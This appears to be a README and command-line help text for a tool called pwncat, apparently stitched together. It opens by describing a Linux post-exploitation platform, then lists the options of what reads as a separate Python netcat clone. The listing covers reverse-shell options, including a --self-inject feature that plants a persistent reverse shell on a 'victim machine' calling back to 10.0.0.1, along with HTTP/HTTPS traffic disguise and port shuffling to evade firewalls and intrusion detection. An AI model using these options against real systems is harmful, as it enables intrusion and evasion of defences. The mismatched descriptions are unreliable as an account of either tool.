# pwncat
pwncat is a post-exploitation platform for Linux targets. It started out as a wrapper around basic bind and reverse shells and has grown from there. It streamlines common red team operations while staging code from your attacker machine, not the target.

pwncat used to only support Linux, but there has been a lot of work recently to support multiple platforms. Currently, there is alpha support for Windows targets. Please see the latest documentation for details on how to use pwncat with a Windows target.

Enhanced and comptaible Netcat implementation written in Python (2 and 3) with
connect, zero-i/o, listen and forward modes and techniques to detect and evade
firewalls and intrusion detection/prevention systems.

If no mode arguments are specified, pwncat will run in connect mode and act as
a client to connect to a remote endpoint. If the connection to the remote
endoint is lost, pwncat will quit. See options for how to automatically re-
connect.

positional arguments:
  hostname              Address to listen, forward, scan or connect to.
                        
  port                  [All modes]
                        Single port to listen, forward or connect to.
                        [Zero-I/O mode]
                        Specify multiple ports to scan:
                        Via list:  4444,4445,4446
                        Via range: 4444-4446
                        Via incr:  4444+2

mode arguments:
  -l, --listen          [Listen mode]:
                        Start a server and listen for incoming connections.
                        If using TCP and a connected client disconnects or the
                        connection is interrupted otherwise, the server will
                        quit. See -k/--keep-open to change this behaviour.
                        
  -z, --zero            [Zero-I/0 mode]:
                        Connect to a remote endpoint and report status only.
                        Used for port scanning.
                        See --banner for version detection.
                        
  -L [addr:]port, --local [addr:]port
                        [Local forward mode]:
                        This mode will start a server and a client internally.
                        The internal server will listen locally on specified
                        addr/port (given by --local [addr:]port).
                        The server will then forward traffic to the internal
                        client which connects to another server specified by
                        hostname/port given via positional arguments.
                        (I.e.: proxies a remote service to a local address)
                        
  -R addr:port, --remote addr:port
                        [Remote forward mode]:
                        This mode will start two clients internally. One is
                        connecting to the target and one is connecting to
                        another pwncat/netcat server you have started some-
                        where. Once connected, it will then proxy traffic
                        between you and the target.
                        This mode should be applied on machines that block
                        incoming traffic and only allow outbound.
                        The connection to your listening server is given by
                        -R/--remote addr:port and the connection to the
                        target machine via the positional arguments.

optional arguments:
  -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.
                        
  -C lf, --crlf lf      Specify, 'lf', 'crlf' or 'cr' to always force replacing
                        line endings for input and outout accordingly. Specify
                        'no' to completely remove any line feeds. By default
                        it will not replace anything and takes what is entered
                        (usually CRLF on Windows, LF on Linux and some times
                        CR on MacOS).
                        
  -n, --nodns           Do not resolve DNS.
                        
  --send-on-eof         Buffer data received on stdin until EOF and send
                        everything in one chunk.
                        
  --no-shutdown         Do not shutdown into half-duplex mode.
                        If this option is passed, pwncat won't invoke shutdown
                        on a socket after seeing EOF on stdin. This is provided
                        for backward-compatibility with OpenBSD netcat, which
                        exhibits this behavior.
                        
  -v, --verbose         Be verbose and print info to stderr. Use -v, -vv, -vvv
                        or -vvvv for more verbosity. The server performance will
                        decrease drastically if you use more than three times.
                        
  --info type           Show additional info about sockets, IPv4/6 or TCP opts
                        applied to the current socket connection. Valid
                        parameter are 'sock', 'ipv4', 'ipv6', 'tcp' or 'all'.
                        Note, you must at least be in INFO verbose mode in order
                        to see them (-vv).
                        
  -c str, --color str   Colored log output. Specify 'always', 'never' or 'auto'.
                        In 'auto' mode, color is displayed as long as the output
                        goes to a terminal. If it is piped into a file, color
                        will automatically be disabled. This mode also disables
                        color on Windows by default. (default: auto)
                        
  --safe-word str       All modes:
                        If pwncat is started with this argument, it will shut
                        down as soon as it receives the specified string. The
                        --keep-open (server) or --reconn (client) options will
                        be ignored and it won't listen again or reconnect to you.
                        Use a very unique string to not have it shut down
                        accidentally by other input.

protocol arguments:
  -4                    Only Use IPv4 (default: IPv4 and IPv6 dualstack).
                        
  -6                    Only Use IPv6 (default: IPv4 and IPv6 dualstack).
                        
  -u, --udp             Use UDP for the connection instead of TCP.
                        
  -T str, --tos str     Specifies IP Type of Service (ToS) for the connection.
                        Valid values are the tokens 'mincost', 'lowcost',
                        'reliability', 'throughput' or 'lowdelay'.
                        
  --http                Connect / Listen mode (TCP and UDP):
                        Hide traffic in http packets to fool Firewalls/IDS/IPS.
                        
  --https               Connect / Listen mode (TCP and UDP):
                        Hide traffic in https packets to fool Firewalls/IDS/IPS.
                        
  -H [str ...], --header [str ...]
                        Add HTTP headers to your request when using --http(s).

command & control arguments:
  --self-inject cmd:host:port[s]
                        Listen mode (TCP only):
                        If you are about to inject a reverse shell onto the
                        victim machine (via php, bash, nc, ncat or similar),
                        start your listening server with this argument.
                        This will then (as soon as the reverse shell connects)
                        automatically deploy and background-run an unbreakable
                        pwncat reverse shell onto the victim machine which then
                        also connects back to you with specified arguments.
                        Example: '--self-inject /bin/bash:10.0.0.1:4444'
                        It is also possible to launch multiple reverse shells by
                        specifying multiple ports.
                        Via list:  --self-inject /bin/sh:10.0.0.1:4444,4445,4446
                        Via range: --self-inject /bin/sh:10.0.0.1:4444-4446
                        Via incr:  --self-inject /bin/sh:10.0.0.1:4444+2
                        Note: this is currently an experimental feature and does
                        not work on Windows remote hosts yet.

pwncat scripting engine:
  --script-send file    All modes (TCP and UDP):
                        A Python scripting engine to define your own custom
                        transformer function which will be executed before
                        sending data to a remote endpoint. Your file must
                        contain the exact following function which will:
                        be applied as the transformer:
                        def transform(data, pse):
                            # NOTE: the function name must be 'transform'
                            # NOTE: the function param name must be 'data'
                            # NOTE: indentation must be 4 spaces
                            # ... your transformations goes here
                            return data
                        You can also define as many custom functions or classes
                        within this file, but ensure to prefix them uniquely to
                        not collide with pwncat's function or classes, as the
                        file will be called with exec().
                        
  --script-recv file    All modes (TCP and UDP):
                        A Python scripting engine to define your own custom
                        transformer function which will be executed after
                        receiving data from a remote endpoint. Your file must
                        contain the exact following function which will:
                        be applied as the transformer:
                        def transform(data, pse):
                            # NOTE: the function name must be 'transform'
                            # NOTE: the function param name must be 'data'
                            # NOTE: indentation must be 4 spaces
                            # ... your transformations goes here
                            return data
                        You can also define as many custom functions or classes
                        within this file, but ensure to prefix them uniquely to
                        not collide with pwncat's function or classes, as the
                        file will be called with exec().

zero-i/o mode arguments:
  --banner              Zero-I/O (TCP and UDP):
                        Try banner grabbing during port scan.

listen mode arguments:
  -k, --keep-open       Listen mode (TCP only):
                        Re-accept new clients in listen mode after a client has
                        disconnected or the connection is unterrupted otherwise.
                        (default: server will quit after connection is gone)
                        
  --rebind [x]          Listen mode (TCP and UDP):
                        If the server is unable to bind, it will re-initialize
                        itself x many times before giving up. Omit the
                        quantifier to rebind endlessly or specify a positive
                        integer for how many times to rebind before giving up.
                        See --rebind-robin for an interesting use-case.
                        (default: fail after first unsuccessful try).
                        
  --rebind-wait s       Listen mode (TCP and UDP):
                        Wait x seconds between re-initialization. (default: 1)
                        
  --rebind-robin port   Listen mode (TCP and UDP):
                        If the server is unable to initialize (e.g: cannot bind
                        and --rebind is specified, it it will shuffle ports in
                        round-robin mode to bind to.
                        Use comma separated string such as '80,81,82,83', a range
                        of ports '80-83' or an increment '80+3'.
                        Set --rebind to at least the number of ports to probe +1
                        This option requires --rebind to be specified.

connect mode arguments:
  --source-addr addr    Specify source bind IP address for connect mode.
                        
  --source-port port    Specify source bind port for connect mode.
                        
  --reconn [x]          Connect mode (TCP and UDP):
                        If the remote server is not reachable or the connection
                        is interrupted, the client will connect again x many
                        times before giving up. Omit the quantifier to retry
                        endlessly or specify a positive integer for how many
                        times to retry before giving up.
                        (default: quit if the remote is not available or the
                        connection was interrupted)
                        This might be handy for stable TCP reverse shells ;-)
                        Note on UDP:
                        By default UDP does not know if it is connected, so
                        it will stop at the first port and assume it has a
                        connection. Consider using --udp-sconnect with this
                        option to make UDP aware of a successful connection.
                        
  --reconn-wait s       Connect mode (TCP and UDP):
                        Wait x seconds between re-connects. (default: 1)
                        
  --reconn-robin port   Connect mode (TCP and UDP):
                        If the remote server is not reachable or the connection
                        is interrupted and --reconn is specified, the client
                        will shuffle ports in round-robin mode to connect to.
                        Use comma separated string such as '80,81,82,83', a range
                        of ports '80-83' or an increment '80+3'.
                        Set --reconn to at least the number of ports to probe +1
                        This helps reverse shell to evade intrusiona prevention
                        systems that will cut your connection and block the
                        outbound port.
                        This is also useful in Connect or Zero-I/O mode to
                        figure out what outbound ports are allowed.
                        
  --ping-init           Connect mode (TCP and UDP):
                        UDP is a stateless protocol unlike TCP, so no hand-
                        shake communication takes place and the client just
                        sends data to a server without being "accepted" by
                        the server first.
                        This means a server waiting for an UDP client to
                        connect to, is unable to send any data to the client,
                        before the client hasn't send data first. The server
                        simply doesn't know the IP address before an initial
                        connect.
                        The --ping-init option instructs the client to send one
                        single initial ping packet to the server, so that it is
                        able to talk to the client.
                        This is a way to make a UDP reverse shell work.
                        See --ping-word for what char/string to send as initial
                        ping packet (default: '\0')
                        
  --ping-intvl s        Connect mode (TCP and UDP):
                        Instruct the client to send ping intervalls every s sec.
                        This allows you to restart your UDP server and just wait
                        for the client to report back in. This might be handy
                        for stable UDP reverse shells ;-)
                        See --ping-word for what char/string to send as initial
                        ping packet (default: '\0')
                        
  --ping-word str       Connect mode (TCP and UDP):
                        Change the default character '\0' to use for upd ping.
                        Single character or strings are supported.
                        
  --ping-robin port     Connect mode (TCP and UDP):
                        Instruct the client to shuffle the specified ports in
                        round-robin mode for a remote server to ping.
                        This might be handy to scan outbound allowed ports.
                        Use comma separated string such as '80,81,82,83', a range
                        of ports '80-83' or an increment '80+3'.
                        Use --ping-intvl 0 to be faster.
                        
  --udp-sconnect        Connect mode (UDP only):
                        Emulating stateful behaviour for UDP connect phase by
                        sending an initial packet to the server to validate if
                        it is actually connected.
                        By default, UDP will simply issue a connect and is not
                        aware if it is really connected or not.
                        The default connect packet to be send is '\0', you
                        can change this with --udp-sconnect-word.
                        
  --udp-sconnect-word [str]
                        Connect mode (UDP only):
                        Change the the data to be send for UDP stateful connect
                        behaviour. Note you can also omit the string to send an
                        empty packet (EOF), but be aware that some servers such
                        as netcat will instantly quit upon receive of an EOF
                        packet.
                        The default is to send a null byte sting: '\0'.
